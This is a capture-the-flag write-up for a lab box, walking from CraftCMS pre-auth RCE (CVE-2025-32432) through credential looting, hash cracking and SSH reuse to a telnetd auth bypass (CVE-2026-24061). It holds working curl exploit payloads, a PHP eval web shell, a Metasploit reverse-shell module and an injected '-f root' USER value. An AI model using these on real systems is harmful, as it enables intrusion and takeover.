---
description: >-
  Difficulty: Easy OS: Linux Chain: CraftCMS pre-auth RCE (CVE-2025-32432) →
  cleartext DB creds → bcrypt crack → SSH → telnetd auth bypass (CVE-2026-24061)
---

# Orion

***

### Overview

Orion chains five steps, each feeding the next:

```
nmap → CraftCMS site → CVE-2025-32432 (pre-auth RCE) → shell as www-data
  → read .env → MySQL root password
  → dump users table → crack bcrypt hash → adam's password
  → SSH reuse → user.txt
  → local telnetd → CVE-2026-24061 auth bypass → root.txt
```

The interesting part is the foothold. The rest is standard loot-and-reuse + a one-liner privesc.

***

### Enumeration

#### Nmap

```bash
nmap -sCV 10.129.X.X
```

Two ports:

```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Port 80 redirects to `orion.htb`, so add it to hosts:

```bash
echo "10.129.X.X orion.htb" | sudo tee -a /etc/hosts
```

#### Web

The site is a telecom company page. Footer reveals **Powered by CraftCMS**.

FFUF finds `/admin`, which redirects to `/admin/login`:

```bash
ffuf -u http://orion.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic
```

The login page leaks the version at the bottom: **Craft CMS 5.6.16** — vulnerable to unauthenticated RCE **CVE-2025-32432**.

> Version disclosure is the whole game on easy boxes. Always read footers, login pages, and HTTP headers.

***

### CVE-2025-32432 — How It Actually Works

This is a **pre-authentication remote code execution** bug. It's really _two_ vulnerabilities stacked:

* **CVE-2025-32432** (Craft CMS) — feeds untrusted user input into Yii's object-configuration system with no auth required.
* **CVE-2024-58136** (Yii framework) — an incomplete fix that lets you bypass the one safety check that was supposed to stop this.

The core idea: you send JSON that _looks_ like image-transform settings, but Craft hands it to code that treats array keys as **instructions to create objects**, not as plain data. Once you can instantiate arbitrary classes, you pick classes whose creation/destruction runs code.

#### Stage 0 — The unauthenticated entry point

The endpoint `/index.php?p=actions/assets/generate-transform` maps to `AssetsController::actionGenerateTransform`, which **does not require authentication**:

```php
public function actionGenerateTransform(?int $transformId = null): Response
{
    if ($transformId) {
        // ...
    } else {
        $assetId  = $this->request->getRequiredBodyParam('assetId');
        $handle   = $this->request->getRequiredBodyParam('handle');
        $transform = ImageTransforms::normalizeTransform($handle);  // user input → here
    }
}
```

Your `handle` object goes straight into `normalizeTransform()`.

#### Stage 1 — Your JSON keys become property assignments

`normalizeTransform()` builds `new ImageTransform($handle)`. The constructor calls `App::configure()`, which is just a blind loop:

```php
public static function configure(object $object, array $properties): void
{
    foreach ($properties as $name => $value) {
        $object->$name = $value;   // every key you send is assigned as a property
    }
}
```

So whatever key names you choose, Craft tries to set them on the object. `ImageTransform` extends Yii's `Component` — and `Component::__set` has magic behavior for certain key names.

#### Stage 2 — The `as` prefix = "create an object"

Yii's `Component::__set` treats any key starting with `as` as a **behavior attachment**, which means _instantiate a class I name_:

```php
} elseif (strncmp($name, 'as ', 3) === 0) {
    $name = trim(substr($name, 3));
    if ($value instanceof Behavior) { ... }
    elseif (isset($value['class']) && is_subclass_of($value['class'], Behavior::class, true)) {
        $this->attachBehavior($name, Yii::createObject($value));   // object creation
    }
}
```

This is why the payload field is named `as session` / `as hack` — the suffix is arbitrary, **only the `as` prefix matters**. This is the jump from _data_ → _object instantiation_.

#### Stage 3 — The `class` / `__class` bypass (CVE-2024-58136)

Notice the guard above: it only proceeds if `$value['class']` is a subclass of `Behavior`. So you can't directly name a dangerous class there.

But `Yii::createObject()` checks `__class` **before** `class`:

```php
public static function createObject($type, array $params = [])
{
    if (isset($type['__class'])) {
        $class = $type['__class'];
        unset($type['__class'], $type['class']);
        return static::$container->get($class, $params, $type);  // uses __class
    }
    if (isset($type['class'])) { ... }
}
```

So the payload supplies **both**:

| Key       | Value                                 | Purpose                                                                     |
| --------- | ------------------------------------- | --------------------------------------------------------------------------- |
| `class`   | `craft\behaviors\FieldLayoutBehavior` | **Decoy** — a real Behavior subclass that passes the `is_subclass_of` guard |
| `__class` | _the class you actually want_         | Used first by `createObject`, never checked                                 |

`class` satisfies the guard; `__class` is the real target. **You now have arbitrary class instantiation with controlled constructor args.**

#### Stage 4 — Gadget A: `FnStream` (proof via phpinfo)

Guzzle's `FnStream` calls an arbitrary stored callable in its destructor:

```php
public function __destruct() {
    if (isset($this->_fn_close)) {
        ($this->_fn_close)();   // calls whatever _fn_close names
    }
}
```

Set `_fn_close` to `phpinfo` → it fires on object destruction. The `__construct()` arg `[[]]` is only there so the constructor doesn't error.

**Limitation:** this is a single function call, no arguments. Great for `phpinfo` proof, useless for a real command.

#### Stage 5 — Gadget B: `PhpManager` (LFI → RCE)

Yii's RBAC `PhpManager` does `require` on a file path you control:

```php
protected function loadFromFile($file) {
    if (is_file($file)) {
        return require $file;   // require = EXECUTES the file as PHP
    }
}
```

`require` on an attacker-chosen file = code execution **if** you can plant PHP somewhere on disk. `allow_url_include` is off by default, so a remote URL won't work directly. This is a **local file inclusion primitive** — identical in spirit to log/session poisoning LFI.

#### Stage 6 — Why two requests (the session-poisoning trick)

You can't `require` a remote URL, so you plant your code locally first:

1.  **GET** an admin page while logged out, with PHP code in the `a` parameter:

    ```
    GET /index.php?p=admin/dashboard&a=<?=eval($_GET['cmd']);die()?>
    ```

    You're not authenticated, so Craft redirects you to login — but on the way it **saves the URL you requested (PHP and all) into your PHP session file** as `__returnUrl`, at:

    ```
    /var/lib/php/sessions/sess_<CraftSessionId>
    ```

    Your code now sits inert on disk. The `CraftSessionId` cookie tells you the exact filename.
2. **POST** the `PhpManager` payload pointing `itemFile` at that session file → `require` runs it → your code executes.

> **This is the answer to "why two requests":** stage 5 gives you file _inclusion_, not file _writing_. You need a separate step to get your payload onto the disk first. The GET-while-logged-out abuses Craft's returnUrl feature as your write primitive.

**Patched in:** Craft 3.9.15 / 4.14.15 / 5.6.17, Yii 2.0.52. Note: patching Craft does **not** remove files an attacker already dropped.

***

### Foothold

#### Dealing with CSRF

CSRF validation is on, so every request needs valid tokens. Grab them from the login page:

* `CraftSessionId` (cookie)
* `CRAFT_CSRF_TOKEN` (cookie)
* `csrfTokenValue` (in the page HTML → sent back as the `X-CSRF-Token` header)

```bash
curl -s -c cookies.txt http://orion.htb/admin/login | grep CSRF
```

This isn't "breaking" CSRF — you're collecting legitimate tokens and replaying them.

#### Manual exploitation

**1. Confirm vulnerable (FnStream → phpinfo):**

```bash
curl 'http://orion.htb/index.php?p=actions/assets/generate-transform' \
  -X POST -H 'Content-Type: application/json' \
  -H 'X-CSRF-Token: <csrfTokenValue>' -b cookies.txt \
  -d '{"assetId":11,"handle":{"width":123,"height":123,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"GuzzleHttp\\Psr7\\FnStream","__construct()":[[]],"_fn_close":"phpinfo"}}}'
```

PHP info page returned = vulnerable.

**2. Plant the web shell into the session file:**

```bash
curl -g -c cookies.txt \
  "http://orion.htb/index.php?p=admin/dashboard&a=<?=eval(\$_GET['cmd']);die()?>"
```

Note the `CraftSessionId` in `cookies.txt`.

**3. Trigger it (PhpManager → require session file):**

```bash
curl -g 'http://orion.htb/index.php?p=actions/assets/generate-transform&cmd=whoami' \
  -X POST -H 'Content-Type: application/json' \
  -H 'X-CSRF-Token: <csrfTokenValue>' -b cookies.txt \
  -d '{"assetId":11,"handle":{"width":123,"height":123,"as hack":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"yii\\rbac\\PhpManager","__construct()":[{"itemFile":"/var/lib/php/sessions/sess_<CraftSessionId>"}]}}}'
```

`whoami` output in the response = RCE.

#### Metasploit (fast path)

```
msfconsole
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
set RHOSTS orion.htb
set RPORT 80
set LHOST <tun0-IP>
exploit
```

> `LHOST` must be your VPN (`tun0`) IP — `ip addr show tun0`. Wrong LHOST = exploit runs, no session.

Lands a meterpreter session as `www-data`. Upgrade:

```
sessions -i 1
shell
script /dev/null -c /bin/bash
```

***

### Lateral Movement — www-data → adam

#### Cleartext DB creds in .env

```bash
cat /var/www/html/craft/.env
```

```
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
CRAFT_DB_DATABASE=orion
```

> `.env` is hidden (dot-prefixed) — won't show in plain `ls`, use `ls -a`.

#### Dump the users table

```bash
mysql -u root -p orion
```

(`-p` prompts for the password; `orion` is the database name, not the password.)

```sql
SELECT username, email, password FROM users;
```

Admin `adam`, bcrypt hash:

```
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg01S
```

#### Crack it

`$2y$` = bcrypt → hashcat mode **3200**:

```bash
echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg01S' > hash.txt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

Cracks to **`darkangel`**.

#### SSH (password reuse)

From **your Kali box** (not from inside the victim — it can't resolve `orion.htb`):

```bash
ssh adam@orion.htb
# password: darkangel
cat user.txt
```

***

### Privilege Escalation — adam → root

#### Find the local-only service

```bash
netstat -tulnp    # or: ss -tulnp
```

```
tcp  0  0 127.0.0.1:23   0.0.0.0:*  LISTEN
```

Port 23 (telnet) listening **only on 127.0.0.1** — invisible to external nmap, which is why it didn't show earlier.

```bash
telnet --version
# telnet (GNU inetutils) 2.7  → vulnerable to CVE-2026-24061
```

#### CVE-2026-24061 — telnetd auth bypass

`telnetd` passes the `USER` environment variable through to `login(1)`. By smuggling `-f root` into it, you make it run `login -f root` — and `-f` **skips authentication**:

```bash
USER="-f root" telnet -a 127.0.0.1
```

```
root@orion:~# cat root.txt
```

Rooted.

***

### Key Takeaways

* **Object-injection RCE** (CVE-2025-32432): untrusted input reaching Yii's `createObject` + the `__class`/`class` bypass. The two-request pattern is because the gadget gives you file _inclusion_, not file _writing_ — you poison a session file first.
* **Session poisoning via returnUrl** is a reusable LFI write-primitive worth remembering.
* **`.env` files** are a go-to post-foothold loot target on any PHP/Laravel/Craft app.
* **Local-only services** (`127.0.0.1`) are only discoverable _after_ foothold — always re-enumerate listening ports from inside.
* **Password reuse** across DB → SSH is the pivot. Always try cracked creds everywhere.

### IOCs / Patch Notes

* Patching Craft does not remove previously dropped files (`filemanager.php`, `autoload_classmap.php`, etc.).
* Detection: POST requests to `generate-transform` with a body field starting `as`; GET requests to admin pages with injected PHP returning 302.
